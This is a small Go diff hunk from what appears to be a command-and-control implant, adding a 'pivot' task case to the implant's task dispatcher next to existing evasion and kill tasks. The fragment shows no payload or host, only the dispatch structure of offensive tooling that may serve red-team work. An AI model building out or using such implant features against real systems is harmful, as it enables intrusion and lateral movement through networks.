@@ -220,6 +220,9 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 		results := InitEvasion()
 		output = []byte(strings.Join(results, "\n"))
 
+	case protocol.TaskPivot:
+		output, err = ExecutePivotCommand(task.Args)
+
 	case protocol.TaskKill:
 		output = []byte("Agent terminating")
 
